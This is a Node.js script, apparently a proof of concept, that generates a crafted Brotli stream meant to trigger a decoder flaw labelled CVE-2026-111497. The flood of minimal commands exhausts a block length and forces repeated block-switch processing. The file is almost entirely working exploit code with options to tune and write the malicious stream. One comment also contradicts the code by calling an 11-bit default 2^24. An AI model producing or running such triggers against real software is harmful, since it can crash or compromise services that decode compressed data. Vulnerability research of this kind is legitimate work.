'use strict';
// Original generator of a large, header-valid Brotli stream that drives the
// CVE-2026-111497 condition: a metablock whose command-category block length
// can be exhausted by a flood of minimal commands, forcing the decoder into
// DecodeBlockTypeAndLength() block-switch processing. Bit layout follows
// RFC 7932; the construction idea is public (see README references). This is
// an original implementation — no third-party code is copied.
//
// Stream shape (all values LSB-first, as Brotli reads them):
//   WBITS            1,0(3),2(3)          -> window bits
//   ISLAST=0; MNIBBLES=code 2 (24 bits); MLEN-1=0xFFFFFF (MLEN = 2^24)
//   ISUNCOMPRESSED=0
//   NBLTYPESL=1                          (varlen 0)
//   NBLTYPESC=2                          (varlen 1)
//     block TYPE tree  (alphabet 4):  1 symbol, sym 0  -> always type 0
//     block COUNT tree (alphabet 26): 1 symbol, sym 25 -> longest count code
//     initial command BLEN: 24 extra bits (default 0xFFFFFF)
//   NBLTYPESD=1                          (varlen 0)
//   NPOSTFIX=3, NDIRECT=0                (6 bits)
//   2 zero bits                          (context-map area)
//   NTREESL=1, NTREESD=1                 (varlen 0 each; no context maps)
//   data trees (single-symbol each):
//     literal  (alphabet 256): sym 0
//     command  (alphabet 704): sym 130   (one per command block type)
//     distance (alphabet 400): sym 184
//   flood: `commands` iterations of an 11-bit distance-extra value (default
//     2^24), emitted as a repeating byte-aligned 8-command group.
//
// Usage: node gen-trigger.js [outFile] [--commands N] [--blen-extra N]
//                            [--dist-extra N] [--no-flood] [--quiet]

const fs = require('fs');

class BitWriter {
  constructor() {
    this.chunks = [];
    this.cur = 0; // partial byte accumulator
    this.used = 0; // bits used in the current partial byte
    this.totalBits = 0;
  }

  put(value, count) {
    // Brotli reads bits LSB-first within each byte.
    for (let i = 0; i < count; i++) {
      const bit = (value >> i) & 1;
      this.cur |= bit << this.used;
      this.used++;
      if (this.used === 8) {
        this.chunks.push(Buffer.from([this.cur]));
        this.cur = 0;
        this.used = 0;
      }
    }
    this.totalBits += count;
  }

  get byteAligned() {
    return this.used === 0;
  }

  align() {
    if (this.used > 0) {
      this.chunks.push(Buffer.from([this.cur]));
      this.cur = 0;
      this.used = 0;
    }
  }

  appendAligned(bytes) {
    if (!this.byteAligned) throw new Error('appendAligned on unaligned writer');
    this.chunks.push(bytes);
    this.totalBits += bytes.length * 8;
  }

  finish() {
    this.align();
    return Buffer.concat(this.chunks);
  }
}

// RFC 7932 variable-length code for small ints (NBLTYPES*, NTREES*):
// encodes `value` such that the decoder reads value+1.
function varLenUint8(bits, value) {
  if (value === 0) {
    bits.put(0, 1);
    return;
  }
  bits.put(1, 1);
  const width = 31 - Math.clz32(value); // floor(log2(value))
  if (width === 0) {
    bits.put(0, 3);
    return;
  }
  bits.put(width, 3);
  bits.put(value - (1 << width), width);
}

// Single-symbol "simple" prefix code (RFC 7932 sec. 3.4): the symbol is then
// coded in zero bits on every read.
function oneSymbolTree(bits, alphabetSize, symbol) {
  bits.put(1, 2); // tree kind: simple
  bits.put(0, 2); // NSYM - 1 = 0
  bits.put(symbol, 32 - Math.clz32(alphabetSize - 1)); // ceil(log2(alphabet))
}

function parseArgs(argv) {
  const out = {
    file: argv[0] && !argv[0].startsWith('--') ? argv[0] : null,
    commands: 1 << 24,
    blenExtra: 0xffffff,
    distExtra: 4,
    flood: true,
    quiet: false,
  };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '--commands') out.commands = parseInt(argv[++i], 10);
    else if (a === '--blen-extra') out.blenExtra = parseInt(argv[++i], 10) & 0xffffff;
    else if (a === '--dist-extra') out.distExtra = parseInt(argv[++i], 10) & 0x7ff;
    else if (a === '--no-flood') out.flood = false;
    else if (a === '--quiet') out.quiet = true;
    else if (!a.startsWith('--') && out.file === null) out.file = a;
  }
  if (!out.file) {
    console.error('usage: node gen-trigger.js <outFile> [--commands N] [--blen-extra N] [--dist-extra N] [--no-flood] [--quiet]');
    process.exit(2);
  }
  return out;
}

function generate(opts) {
  const bits = new BitWriter();

  // --- stream header: window bits -------------------------------------
  bits.put(1, 1);
  bits.put(0, 3);
  bits.put(2, 3);

  // --- metablock header -------------------------------------------------
  bits.put(0, 1); // ISLAST = 0
  bits.put(2, 2); // MNIBBLES code 2 -> 6 nibbles -> 24 bits
  bits.put(0xffffff, 24); // MLEN-1 -> MLEN = 2^24
  bits.put(0, 1); // ISUNCOMPRESSED = 0

  // literal block types: single type
  varLenUint8(bits, 0); // NBLTYPESL = 1

  // command block types: two types (declares switch trees)
  varLenUint8(bits, 1); // NBLTYPESC = 2
  oneSymbolTree(bits, 4, 0); // block TYPE code tree: always type 0
  oneSymbolTree(bits, 26, 25); // block COUNT code tree: longest code, 24 extra
  bits.put(opts.blenExtra, 24); // initial command BLEN extra bits

  // distance block types: single type
  varLenUint8(bits, 0); // NBLTYPESD = 1

  // distance modifiers + context-map area
  bits.put(3, 6); // NPOSTFIX = 3 (2 bits), NDIRECT = 0 (4 bits)
  bits.put(0, 2);
  varLenUint8(bits, 0); // NTREESL = 1 (no literal context map)
  varLenUint8(bits, 0); // NTREESD = 1 (no distance context map)

  // data trees, one single-symbol tree each
  oneSymbolTree(bits, 256, 0); // literals: sym 0
  oneSymbolTree(bits, 704, 130); // commands, block type 0
  oneSymbolTree(bits, 704, 130); // commands, block type 1
  oneSymbolTree(bits, 400, 184); // distances: sym 184

  const headerBits = bits.totalBits;

  // --- command flood -----------------------------------------------------
  // Each iteration is one command: 0-bit command symbol (sym 130 via the
  // single-symbol tree) + 0-bit distance symbol (sym 184) + 11 bits of
  // distance extra. 8 iterations x 11 bits = 88 bits = 11 bytes exactly, so
  // after byte alignment the whole flood is one repeating 11-byte group.
  let out;
  if (opts.flood) {
    let done = 0;
    while (!bits.byteAligned && done < opts.commands) {
      bits.put(opts.distExtra, 11);
      done++;
    }
    const group = new BitWriter();
    for (let i = 0; i < 8; i++) group.put(opts.distExtra, 11);
    const groupBytes = group.finish();
    const remaining = opts.commands - done;
    const groups = remaining >> 3;
    const tail = remaining & 7;
    bits.appendAligned(
      Buffer.concat(Array.from({ length: groups }, () => groupBytes))
    );
    const tailBits = new BitWriter();
    for (let i = 0; i < tail; i++) tailBits.put(opts.distExtra, 11);
    const tailBytes = tailBits.finish();
    if (tailBytes.length) bits.appendAligned(tailBytes);
    out = bits.finish();
  } else {
    out = bits.finish();
  }

  return { stream: out, headerBits };
}

function main() {
  const opts = parseArgs(process.argv.slice(2));
  const { stream, headerBits } = generate(opts);
  fs.writeFileSync(opts.file, stream);
  if (!opts.quiet) {
    console.log(
      JSON.stringify({
        file: opts.file,
        bytes: stream.length,
        headerBits,
        commands: opts.flood ? opts.commands : 0,
        blenExtra: opts.blenExtra,
      })
    );
  }
}

main();
